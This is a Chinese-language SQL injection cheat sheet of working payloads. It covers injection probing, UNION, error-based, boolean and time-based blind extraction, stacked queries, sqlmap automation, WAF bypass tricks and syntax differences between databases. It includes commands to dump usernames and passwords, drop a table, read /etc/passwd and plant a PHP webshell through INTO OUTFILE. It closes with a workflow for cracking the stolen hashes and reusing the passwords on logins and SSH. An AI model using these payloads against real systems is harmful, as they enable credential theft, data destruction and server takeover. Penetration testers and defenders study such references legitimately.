```
# ========== 一、注入点探测 ==========

# 单引号,看是否报错/异常
'
# 双引号
"
# 闭合括号
')
# 数字型: 真->正常 / 假->异常
1 AND 1=1
1 AND 1=2
# 字符型: 真 / 假
' AND '1'='1
' AND '1'='2
# 加大数字, 报错处=列数边界
1' ORDER BY 1-- -
# 无回显时看是否延迟5秒
sleep(5)-- -


# ========== 二、判断闭合与类型 ==========

# 加引号报错 -> 字符型
?id=1'
# 单引号闭合
?id=1' -- -
# 双引号闭合
?id=1" -- -
# 单引号+括号
?id=1') -- -
# 双引号+双括号
?id=1")) -- -

# 类型判定:
#   有数据回显   -> UNION / 报错注入
#   只有真/假    -> 布尔盲注
#   完全无变化   -> 时间盲注
#   报错回显页面 -> 报错注入(最省事)


# ========== 三、UNION 联合注入 ==========

# 先定列数
1' ORDER BY 5-- -
# 找回显位 (id改负让UNION显示)
-1' UNION SELECT 1,2,3,4,5-- -
# 版本
-1' UNION SELECT 1,version(),3,4,5-- -
# 当前库
-1' UNION SELECT 1,database(),3,4,5-- -
# 当前用户
-1' UNION SELECT 1,user(),3,4,5-- -
# 所有表名
-1' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
# 某表列名 (0x7573657273 = users 的hex)
-1' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name=0x7573657273-- -
# dump 凭据 (0x3a = 冒号)
-1' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users-- -


# ========== 四、报错注入 (有报错回显) ==========

# extractvalue 一次最多32字符
1 AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
# 取所有表名
1 AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
# updatexml
1 AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
# floor 报错
1 AND (SELECT 1 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
# 长数据分段取
1 AND extractvalue(1,concat(0x7e,substring((SELECT password FROM users LIMIT 1),1,32)))-- -
1 AND extractvalue(1,concat(0x7e,substring((SELECT password FROM users LIMIT 1),33,32)))-- -


# ========== 五、布尔盲注 (只有真/假) ==========

# 验证真假信号
1 AND 1=1-- -
1 AND 1=2-- -
# 探长度
1 AND (SELECT length(database()))=4-- -
# 二分猜字符
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -
# 直接验证目标用户是否存在 (admin)
1 AND (SELECT COUNT(*) FROM users WHERE username=0x61646d696e)>0-- -
# 取该用户密码字符
1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username=0x61646d696e),1,1))>50-- -
# 提速: 哈希只含0-9a-f, 用Intruder逐位穷举16字符, 或脚本二分


# ========== 六、时间盲注 (完全无变化) ==========

# 注入存在则延迟5秒
1 AND sleep(5)-- -
# 条件为真才延迟
1 AND IF(1=1,sleep(5),0)-- -
# 盲注取字符
1 AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,sleep(5),0)-- -
# sleep被过滤时用benchmark
1 AND IF(1=1,benchmark(5000000,md5(1)),0)-- -


# ========== 七、堆叠 / 文件读写 ==========

# 堆叠查询 (需驱动支持)
1; DROP TABLE users-- -
# 读文件 (需FILE权限)
1' UNION SELECT 1,load_file('/etc/passwd'),3-- -
# 写webshell
1' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/s.php'-- -
# 看文件读写限制
1' UNION SELECT 1,@@secure_file_priv,3-- -


# ========== 八、sqlmap 自动化 ==========

# GET参数
sqlmap -u "http://host/?id=1" --batch --dbs
# 从Burp存的请求 (自动带cookie)
sqlmap -r req.txt --batch --dbs
# 提高检测强度
sqlmap -r req.txt --batch --level=5 --risk=3 --dbs
# 列库表字段
sqlmap -r req.txt --batch -D <库> --tables
sqlmap -r req.txt --batch -D <库> -T <表> --columns
# dump指定列
sqlmap -r req.txt --batch -D <库> -T <表> -C user,pass --dump
# 只布尔盲注+多线程
sqlmap -r req.txt --batch --technique=B --dbms=mysql --threads=10
# 拿shell
sqlmap -r req.txt --batch --os-shell
# 数组参数/指定注入点: 在参数后加 *  ->  .../?param[]=4&param[]=6*


# ========== 九、WAF / 过滤绕过 ==========

# 注释代替空格
1/**/AND/**/1=1-- -
# 空白符 (%09 %0a %0b %0c %0d %a0)
1%09AND%091=1-- -
# 大小写混合
1 UnIoN SeLeCt ...
# 双写绕过滤
1 UNIUNIONON SELSELECTECT ...
# hex 代替 'admin'
WHERE username=0x61646d696e
# char() 代替
WHERE username=char(97,100,109,105,110)
# 逗号被过滤时
SUBSTRING(x FROM 1 FOR 1)
# 不同注释符都试
-- -    #    /**/    ;%00


# ========== 十、各数据库语法差异 ==========

# 当前库:  MySQL database() | MSSQL db_name() | PgSQL current_database() | Oracle SELECT name FROM v$database
# 版本:    MySQL/PgSQL version() | MSSQL/MySQL @@version | Oracle SELECT banner FROM v$version
# 拼接:    MySQL concat(a,b) | MSSQL a+b | PgSQL/Oracle a||b
# 截取:    MySQL/MSSQL substring(s,pos,len) | Oracle substr(s,pos,len)
# 延时:    MySQL sleep(5) | MSSQL waitfor delay '0:0:5' | PgSQL pg_sleep(5) | Oracle dbms_lock.sleep(5)
# 表信息:  MySQL/MSSQL/PgSQL information_schema.tables/.columns | Oracle all_tables/all_tab_columns
# 注释:    MySQL -- - # /**/ | MSSQL -- /**/ | Oracle --


# ========== 通用思路 ==========

# 1. 找参数 -> 引号/AND探测 -> 确认注入+闭合方式
# 2. 判类型: 回显->UNION; 报错->error-based; 真假->布尔; 无变化->时间盲注
# 3. 摸结构: database() -> tables -> columns
# 4. dump凭据: username/password/email
# 5. 破哈希 (hashcat -m 0 MD5 / -m 100 SHA1) -> 撞登录/SSH (注意密码复用)
# 6. 量大上sqlmap; 被拦上第九节绕过
```